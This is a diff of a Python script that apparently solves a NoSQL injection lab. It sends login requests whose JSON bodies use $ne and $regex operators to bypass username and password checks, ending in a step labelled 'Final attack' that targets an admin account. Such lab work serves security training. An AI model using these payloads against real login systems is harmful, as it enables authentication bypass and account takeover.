@@ -58,18 +58,23 @@ async def main():
     _, response = await print_net_result(raw_req_0, False)
 
     # It succeed: it bypasses the username verification and logs in as the first user in the database with this password (wiener?)
-    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":"peter"}''')
+    raw_req_3a = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":"peter"}''')
     print('$ne for username:', end='')
-    _, response = await print_net_result(raw_req_0, False)
+    _, response = await print_net_result(raw_req_3a, False)
+
+    # It succeed: regex is supported!
+    raw_req_3b = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$regex":"wien.*"},"password":"peter"}''')
+    print('$regex for username:', end='')
+    _, response = await print_net_result(raw_req_3b, False)
 
     # It fails: Query returns unexpected number of records
-    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":{"$ne":""}}''')
+    raw_req_3c = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":{"$ne":""}}''')
     print('$ne for usr and pwd:', end='')
-    _, response = await print_net_result(raw_req_0, True)
+    _, response = await print_net_result(raw_req_3c, True)
 
-    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$regex":"admin.*"},"password":{"$ne":""}}''')
+    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$regex":"admin.*"},"password":{"$ne":""}}''')
     print('Final attack:', end='')
-    _, response = await print_net_result(raw_req_0, True)
+    _, response = await print_net_result(raw_req_4, True)
 
 if __name__ == "__main__":
     asyncio.run(main())
